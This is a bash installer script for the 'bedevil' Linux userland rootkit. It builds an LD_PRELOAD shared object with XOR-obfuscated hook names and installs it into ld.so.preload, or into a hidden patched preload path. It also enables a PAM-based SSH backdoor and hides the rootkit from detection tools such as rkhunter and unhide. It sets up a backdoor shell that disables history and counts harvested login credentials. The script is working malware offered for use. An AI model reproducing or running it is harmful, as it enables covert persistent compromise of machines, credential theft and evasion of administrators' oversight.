#!/bin/bash

# main utility centre for all things bedevil.
# see README.txt for more information on this script's full purpose.

BDVLC="bdvl.c" # main C file to write to
BDVLSO="`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n1`.so" # shared object to create
MDIR="modules"
NEW_MDIR="awesome_modules"
PHOOKC="$NEW_MDIR/prehook.c" # contains constructor and destructor
CREDFILE="$NEW_MDIR/headers/rk_creds.h"
LIBHOOKS="$NEW_MDIR/lib_hooks"
XK='AC'
PLATFORM="`uname -m`"

SINCLUDES="$MDIR/std_includes"
MINCLUDES="$MDIR/module_includes"

# default variables for certain settings.
# these can/will be changed during setup.
MGID=$RANDOM
IDIR="/lib/bedevil.$RANDOM"
BD_ENV="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
LDSO_PRELOAD="/etc/ld.so.preload"

LIBC_PATH="libc.so.6"
LIBDL_PATH="libdl.so.1"
LIBPAM_PATH="libpam.so.0"

# later stores all of the kits hooks
# see modules/lib_hooks
declare -a array HOOKS=()

# a list of processes/binaries to hide from
declare -a array HPROCS=("lsrootkit" "ldd" "unhide" "rkhunter" "chkproc" "chkdirs" "ltrace" "strace" "LD_AUDIT")

if [ -f ".ascii" ]; then
    NICEASCII="`cat .ascii`"
    printf "\e[1m\e[31m$NICEASCII\e[0m\n"
fi

[ $(id -u) != 0 ] && { echo " [!] You do not have root privileges. Your actions are limited."; NOT_ROOT=1; }
[ ! -e /proc ] && { echo " [!] /proc doesn't exist, exiting. May I suggest bailing from this box?"; exit; }
[ "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] || echo "UsePAM yes" >> /etc/ssh/sshd_config

if [ -f /etc/syslinux/config ]; then
    echo " [!] SELinux detected on this system."
    if [[ $(cat /etc/syslinux/config | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]]; then
        echo " [!] SELinux is in enforcing mode. This may cause complications with bedevil."
        echo " [!] If you would like to, you may disable SELinux and continue."
        echo " [!] I will not disable SELinux for you, although I could."
        echo " [!] Disabling/removing SELinux presence on a box that's meant to have it"
        echo "     isn't very quiet to say the least, and keeping it enabled causes problems."
        echo " [!] If I were you, I'd avoid SELinux all together."
    fi
fi

HELPMSG="
Usage: $0 [ -h | -v | -d | -f | -D | -c | -C | -i]
        -h: Show this help message and exit.
        -v: Toggle verbose output.
        -d: Populate rootkit headers with user data.
        -f: Toggle use of preconfigured settings file.
            You will be prompted for a file location during
            installation. This can be a local url or via http.
        -D: Install all potential required dependencies.
        -c: Make $BDVLSO in current directory and exit.
            $BDVLC and $NEW_MDIR must be present.
        -C: Clean up installation/compilation mess and exit.
        -i: Launch full installation of bedevil. You will be
            prompted for input when needed.
"

show_help()
{
  echo "$HELPMSG"
}

verb() { [ $VERBOSE = 1 ] && echo " [VERBOSE] : $1"; }

asc() { printf '%d' "'$1"; }
xenc()
{
    local din=$1
    local ptr dout val1
    for (( ptr=0;ptr<${#din};ptr++ )); do
        val1=$(asc "${din:$ptr:1}")
        dout+=$(printf '\\\\x%02x' "$((val1 ^ 0xac))")
    done
    printf '%s' "$dout"
}

gcharstrb()
{
    # $1 = libname
    # $2 = size of char array
    cl="`echo -n $1 | awk '{print toupper($0)}'`"
    echo "\n#define ${cl}_SIZE $2\nstatic char *${1}_calls[${cl}_SIZE] = {"
}

# builds the char string
# bleh
glibhooks()
{
  [ ! -f $LIBHOOKS ] && LIBHOOKS="$MDIR/lib_hooks" # fallback to plain (unconfigured) modules dir
  lhc=("$(cat $LIBHOOKS)")
  clibchar=""
  for lhookd in $lhc; do
    verb "current hook line: $lhookd"
    IFS=':' read -a lhookc <<< "$lhookd"
    # lhookc[0] = name of lib
    # lhookc[1] = another list, this one of symbols
    clibname="${lhookc[0]}"
    chooks="${lhookc[1]}"
    IFS=',' read -a lhooks <<< "$chooks"
    verb "\$lhookc[0](lib)=$clibname,\$lhooks[*](hooks)=${lhooks[*]}"

    # setup const char for header
    clibchar+="`gcharstrb $clibname ${#lhooks[@]}`"
    for chook in ${lhooks[@]}; do
        HOOKS+=("$chook")
        clibchar+="\"`xenc $chook`\","
        verb "\$chook=$chook"
    done
    clibchar="${clibchar::-1}};"
    verb "clibchar=$clibchar"
  done
    verb "\${HOOKS[*]}=${HOOKS[*]}"
    printf "$(ghookindexi ${HOOKS[@]})${clibchar}"
}

ghookindexi()
{
    verb "doing thing"
    HOOKS=("$@")
    verb "\${HOOKS[*]}=${HOOKS[*]}"

    gcallschr="`gcharstrb "all" ${#HOOKS[@]}`"
    for chook in ${HOOKS[@]}; do
      gcallschr+="\"`xenc $chook`\","
    done
    gcallschr="${gcallschr::-1}};\n"

    gcallschr+="`gcharstrb "hprocs" ${#HPROCS[@]}`"
    for cproc in ${HPROCS[@]}; do
        gcallschr+="\"`xenc $cproc`\","
    done
    gcallschr="${gcallschr::-1}"
    gcallschr="${gcallschr//\\x/\\\\x}};\n"
    verb "gcallschr=$gcallschr"

    indx=0
    for chook in ${HOOKS[@]}; do
        gcallschr+="#define C`echo $chook | awk '{print toupper($0)}'` $indx\n"
        let "indx=$indx+1"
    done
    verb "last call=${HOOKS[(($indx-1))]}"
    printf "${gcallschr//\\x/\\\\\x}"
}

writechrs()
{
    [ ! -d "$NEW_MDIR" ] && return
    spefhooks="$(glibhooks)"
    printf "${spefhooks//\\x/\\\\x}\n#endif" >> $CREDFILE
}

# $1 = plaintext pwd
guserpwd()
{
    if [ ! -z "`which python3`" ]; then
        echo -n `python3 -c "import crypt;print(crypt.crypt('$1'))"` # python's crypt function generates a salt of 16 random chars
        return
    fi
    # hence i'm by default making your salt a random set of 16 chars here
    # if you don't have python3. as far as i know, most boxes that aren't ARM
    # can use openssl's -6 algorithm below.
    echo -n $(openssl passwd -6 -salt `cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 16 | head -n1` $1)
}

# the config wizard will ask for variable input based on what placeholders are available.
# if a placeholder appears to be a number, the wizard will ask for a number.
# and if it's a string placeholder, it will ask for a string. fairly straight forward.
# if no input is given, the default fallback is to set the variable to a random value.
# all of the settings will be displayed to the user at the end of the function.
start_config_wizard()
{
    # use basic 'request & reply' system to communicate variables. less chance of things going wrong.
    
    # first we need to find what placeholders are available in our module directory.
    find_pholders

    # now that we know what placeholders are available, let's organise a list so we know exactly what placeholder we're
    # subbing a new variable for and when.
    for var in ${STR_VARS[*]}; do
        verb "'${FUNCNAME[0]}' - $var"
        unset REPLY
        RAND_VALUE="`cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 8 | head -n1`"
        [[ "$var" == *"IDIR"* ]] && RAND_VALUE=$IDIR
        [[ "$var" == *"BD_ENV"* ]] && RAND_VALUE=$BD_ENV
        [[ "$var" == *"LDSO_PRELOAD"* ]] && RAND_VALUE=$LDSO_PRELOAD
        [[ "$var" == *"SOPATH"* ]] && RAND_VALUE="$IDIR/$BDVLSO.$PLATFORM" # this should run after (if) IDIR has been changed

        [[ "$var" == *"LIBDL_PATH"* ]] && RAND_VALUE=$LIBDL_PATH
        [[ "$var" == *"LIBC_PATH"* ]] && RAND_VALUE=$LIBC_PATH
        [[ "$var" == *"LIBPAM_PATH"* ]] && RAND_VALUE=$LIBPAM_PATH

        read -p " [..] Variable input for ${var//\?} [$RAND_VALUE]: "
        if [ ! -z $REPLY ]; then
            if [[ "$var" == *"BD_PWD"* ]]; then
              
              PSETTINGS+="\"`xenc $(guserpwd $REPLY)`\":$var "
                continue
            fi

            PSETTINGS+="\"`xenc $REPLY`\":$var "
            [[ "$var" == *"IDIR"* ]] && eval IDIR="$REPLY"
            [[ "$var" == *"BD_ENV"* ]] && eval BD_ENV="$REPLY"
            [[ "$var" == *"LDSO_PRELOAD"* ]] && eval LDSO_PRELOAD="$REPLY"


            [[ "$var" == *"LIBDL_PATH"* ]] && eval LIBDL_PATH="$REPLY"
            [[ "$var" == *"LIBC_PATH"* ]] && eval LIBC_PATH="$REPLY"
            [[ "$var" == *"LIBPAM_PATH"* ]] && eval LIBPAM_PATH="$REPLY"
        else
            if [[ "$var" == *"BD_PWD"* ]]; then
              PSETTINGS+="\"`xenc $(guserpwd $RAND_VALUE)`\":$var "
              continue
            fi
            PSETTINGS+="\"`xenc $RAND_VALUE`\":$var "
        fi
    done

    for var in ${INT_VARS[*]}; do
        verb "'${FUNCNAME[0]}' - $var"
        unset REPLY
        RAND_VALUE=`cat /dev/urandom | tr -dc '1-9' | fold -w 4 | head -n1`
        [[ "$var" == *"MGID"* ]] && { let "MGID %= 9999"; RAND_VALUE=$MGID; }
        
        read -p " [..] Variable input for ${var//\?} [$RAND_VALUE]: "
        if [ ! -z $REPLY ]; then
            PSETTINGS+="$REPLY:$var "
            [[ "$var" == *"MGID"* ]] && eval MGID=$REPLY
        else
            PSETTINGS+="$RAND_VALUE:$var "
        fi
    done

    verb $PSETTINGS
}

gather_user_settings()
{
    # the user has enabled the flag to use a file with predefined variables, prompt for the location of the file now.
    # file can be stored locally or through http. (i.e. http://google.com/my_bedevil_settings.txt)
    # each predefined variable should also have the respective placeholder next to it, separated by a colon.
    # i.e.:
    #   my_bedevil_username:??UNAME??
    #   my_bedevil_password:??PWD??
    if [ ! -z $PRECONF_SETTINGS ]; then
        echo " [!] You have enabled the use of a preconfigured variable file."
        echo " [!] The file can be stored locally (in this directory) or on a http server."
        echo " [..] i.e. 'my_bedevil_settings.txt' OR 'http://google.com/my_bedevil_settings.txt'"

        unset REPLY
        while [ -z $REPLY ]; do
            read -p " [!] Enter the location of the file: "
        done
        if [[ "$REPLY" == *"http://"* ]]; then # if 'http://' in reply
            PSETTINGS="`wget -qO- $REPLY`" || { echo " [!] Aborting '${FUNCNAME[0]}' - Could not download file."; return; }
        else # if reply is just regular text
            [ ! -f $REPLY ] && { echo " [!] Aborting '${FUNCNAME[0]}' - File '$REPLY' does not exist."; return; }
            PSETTINGS="`cat $REPLY`"
        fi
    fi

    # PSETTINGS has not been created yet - the user is just using the regular method of configuration - begin the 'wizard'
    [ -z $PSETTINGS ] && start_config_wizard # once this function is complete, PSETTINGS will be created and it can then be parsed
}

c_includes()
{
    _inc="`cat $SINCLUDES | grep -o '^[^#]*' && cat $MINCLUDES | grep -o '^[^#]*'`"
    while read -r line; do
        echo "#include $line" 
    done <<< "$_inc"
}

INT_VARS=()
STR_VARS=()
find_pholders()
{
    HDC=("$(find ./$MDIR/ -name '*.h' | xargs cat)")
    for w in $HDC; do
        CVAR=`echo $w | grep "??"`
        if [[ $CVAR == *"\""* ]]; then STR_VARS+=($CVAR);
        else INT_VARS+=($CVAR); fi
    done

    verb "'${FUNCNAME[0]}' - STR and INT var placeholders"
    verb "${STR_VARS[@]} ${INT_VARS[@]}"
}

# 1st arg = file location of current header in which we will be overwriting variable placeholders.
# so while we're going through every header, we're gonna try see if we can overwrite all the placeholders we know with our new variables.
# we don't know what placeholders are in which files, but we do know what placeholders exist, so we can kinda just bruteforce our new stuff in.
# there's probably a more efficient way of doing this rofl, but unless we're looking at lots of headers we should be gucci.
# this is done by using $PSETTINGS. $PSETTINGS is laid out like the following: NEW_VALUEX:??OLD_PLACEHOLDER??
# this was meant to be one of my final goals. and it was one of the first things i done.
overwrite_pholders()
{
    CPHOLDER=$1
    IFS=' ' read -a PSETTING <<< "$PSETTINGS"
    for ps in ${PSETTING[@]}; do
        IFS=':' read -a cps <<< "$ps"
        cx=$(printf ''${cps[0]}'' )
        verb "cps[0]=${cps[0]}" # new value
        verb "cps[1]=${cps[1]}" # old placeholder
        sed -i "s/${cps[1]}/${cx//x/'\\'\x}/g" $CPHOLDER # i don't know if this is proper but it works
    done
}

# only populate placeholders in new 'modules' directory. notify user the directory has been made with respective rootkit settings
populate_new_pholders()
{
    # if there is already a populated modules directory, ask the user if they want to overwrite it or not.
    # selecting no will abort the function. this seemed safe and practical to have.
    if [ -d $NEW_MDIR ]; then
        echo " [!] Directory $NEW_MDIR already exists."
        read -p " [!] Overwrite it? [y/N]: " -n 1 -r
        if [[ $REPLY =~ ^[Yy]$ ]]; then # they want to overwrite the populated directory
            echo
            echo " [!] Overwriting '$NEW_MDIR'"
            rm -rf $NEW_MDIR
        else # they do not want to overwrite the directory.
            echo
            echo " [+] You did not want to overwrite '$NEW_MDIR'"
            echo " [+] We will use the existing directory."
            return
        fi
    fi

    # copy module directory to new directory
    cp -r $MDIR/ $NEW_MDIR/ || { echo " [!] Aborting '${FUNCNAME[0]}' - Couldn't copy module directory."; return; }

    # write all of of the required char array of xor'd names of symbols we're hooking
    # this writes individual arrays for each different lib and also one array for /all/ hooks
    writechrs

    # module directory has been copied. now we get together all of our settings
    gather_user_settings

    # now PSETTINGS definitely exists, we can start parsing it for variables and replacing old placeholders
    PHEADERS=("$(find ./$NEW_MDIR/ -name '*.h')")
    for h in $PHEADERS; do # go through every possible header
        overwrite_pholders $h
    done

    echo " [+] New directory '$NEW_MDIR' has been created and populated with respective settings."
}

cleanup_bdvl()
{
    [ -d $NEW_MDIR ] && rm -rf $NEW_MDIR
    [ -f $BDVLC ] && rm -f $BDVLC
    rm -f *.so.*
}

build_bdvlc()
{
    [ ! -d $NEW_MDIR ] && { echo " [!] Failed to build $BDVLC - '$NEW_MDIR' does not exist."; return; }
    [ -f $BDVLC ] && echo " [..] $BDVLC exists already. It will be overwritten."
    _BDVLC="#define _GNU_SOURCE
`c_includes`
`cat $PHOOKC`"
    echo "$_BDVLC" > $BDVLC
}

install_deps()
{
    echo " [+] Installing dependencies"
    if [ -f /usr/bin/yum ]; then
        yum install -y -q -e 0 gcc pam-devel newt libgcc.i686 glibc-devel.i686 glibc-devel libpcap libpcap-devel vim-common &>/dev/null
    elif [ -f /usr/bin/apt-get ]; then
        dpkg --add-architecture i386 &>/dev/null
        yes | apt-get update &>/dev/null
        apt-get --yes --force-yes install libpam-dev libpcap-dev gcc-multilib build-essential &>/dev/null
        [ ! -z "$(apt-cache search libpcap0.8-dev)" ] && apt-get --yes --force-yes install libpcap0.8-dev &>/dev/null
        grep -i ubuntu /proc/version &>/dev/null && rm -f /etc/init/plymouth* &>/dev/null
    elif [ -f /usr/bin/pacman ]; then
        pacman -Syy &>/dev/null
        pacman -S --noconfirm pam libpcap base-devel &>/dev/null
    fi
}

compile_bdvl()
{
    [ ! -d "$NEW_MDIR" ] && { echo " [!] '$NEW_MDIR' does not exist. Have you populated your new headers?"; exit; }
    WARNING_FLAGS="-Wall -Wno-comment"
    OPTIMIZATION_FLAGS="-O0 -g0"
    OPTIONS="-fomit-frame-pointer -fPIC"
    LINKER_OPTIONS="-Wl,--build-id=none"
    LINKER_FLAGS="-ldl -lcrypt"

    rm -rf *.so.*
    gcc -std=gnu99 $OPTIMIZATION_FLAGS $BDVLC $WARNING_FLAGS $OPTIONS -I$NEW_MDIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $BDVLSO.$PLATFORM
    gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS $BDVLC $WARNING_FLAGS $OPTIONS -I$NEW_MDIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $BDVLSO.i686 &>/dev/null
    strip $BDVLSO.$PLATFORM || { echo " [!] Couldn't strip library. Exiting."; exit; }
    strip $BDVLSO.i686 &>/dev/null

    echo " [+] bedevil shared library compiled and (presumably) is ready to be preloaded."
    rm $BDVLC
}

# $1 = installation directory (home)
setup_home()
{
    echo '. .bashrc' > "$1/.profile"
    LBASHRC="$1/.bashrc"
    [ -f ".ascii" ] && cp .ascii $1/.ascii
    RBASHRC="tty -s || return
[ ! -z \$TERM ] && export TERM=xterm
unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND
export ${BD_ENV}=1
[ \$(id -u) != 0 ] && su root
[ \$(id -u) != 0 ] && kill -9 \$\$
clear
alias ls='ls --color=auto'
alias ll='ls --color=auto -AlFhn'

[ -f .ascii ] && cat .ascii
id
[ ! -f ./auth_logs ] && touch auth_logs
echo -e \"\\033[1mLogged account creds: \\033[1;31m\$(grep Username ~/auth_logs 2>/dev/null | wc -l)\\033[0m\""
    echo "$RBASHRC" > $LBASHRC

    chown $MGID:$MGID $LDSO_PRELOAD $1 $1/* $1/.profile $1/.bashrc $1/.ascii
}

install_bdvl()
{
    [ ! -z $NOT_ROOT ] && { echo " [!] You cannot install bedevil without root privs. Exiting."; exit; }

    printf " [+] Starting full installation!\n\n"

    echo " [+] bedevil comes with the same feature as vlany, where you can patch the dynamic linker"
    echo "     libraries and change the path which the linker reads from to preload libraries."
    echo "     Essentially creating a 'new' ld.so.preload file."
    echo " [+] Unlike vlany, the lib patching script uses bash, not python2. So no python required."
    echo " [+] The new ld.so.preload file will be placed into a random directory with a random file"
    echo "     name to accompany it."
    echo " [+] If you are doing this, you need to do this now."
    
    read -p " [!] Patch libdl? [Y/n]: " -n 1 -r
    if [[ $REPLY =~ ^[Yy]$ ]]; then patch_libdl;
    else echo " [!] Not patching libdl."; fi

    read -p " [!] Install potential dependencies? [Y/n]: " -n 1 -r
    [[ $REPLY =~ ^[Yy]$ ]] && install_deps
    echo ""

    populate_new_pholders # this will check, for us, if $NEW_MDIR exists or not, and will make it
    build_bdvlc # builds bdvl.c so we can compile the SO
    compile_bdvl # after this, bdvl.so.* will now exist in the cwd

    export ${BD_ENV}=1
    SO_PATH="$IDIR/$BDVLSO.$PLATFORM" # we initialize this now, since the variables may have been changed up until now
    
    # now we have to install the library and make sure it is present in ld.so.preload
    echo " [+] Installing $BDVLSO to $SO_PATH and loading into $LDSO_PRELOAD"
    rm -rf $IDIR/
    mkdir -p $IDIR/

    cp $BDVLSO.$PLATFORM $SO_PATH
    cp $BDVLSO.i686 $IDIR/$BDVLSO.i686 2>/dev/null
    [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
    echo -n $SO_PATH > $LDSO_PRELOAD
    echo " [+] bedevil has been installed on the machine."
    echo " [+] Cleaning up local mess."
    cleanup_bdvl

    echo " [+] About to set up your home for the PAM backdoor."
    setup_home $IDIR
    echo " [+] Your home is set up. All you need to do is log into your
               backdoor via ssh with the credentials you specified during installation.
               You may need to first restart the ssh service on this box."
}

patch_libdl()
{
    echo " [..] Patching dynamic linker libraries."
    LDSO_PRELOAD="$(./plibdl.sh)" # change the variable to the new preload file location
    echo " [+] Dynamic linker libs patched, new ld.so.preload location: $LDSO_PRELOAD"
}


OPTIND=1
VERBOSE=0

while getopts "h?vdfpcCbiD" opt; do
    case "$opt" in
    h)
        show_help
        exit
        ;;
    v)  echo " [+] Running in verbose mode."
        VERBOSE=1
        ;;
    d)  
        populate_new_pholders
        ;;
    f)  PRECONF_SETTINGS=1
        ;;
    p)  
        gather_user_settings
        echo $PSETTINGS > example_config
        exit
        ;;
    c)
        compile_bdvl
        ;;
    C)
        cleanup_bdvl
        exit
        ;;
    b)
        build_bdvlc
        ;;
    i)
        install_bdvl
        exit
        ;;
    D)
        install_deps
        exit
        ;;
    ?)
        show_help
        exit
        ;;
    esac
done

show_help
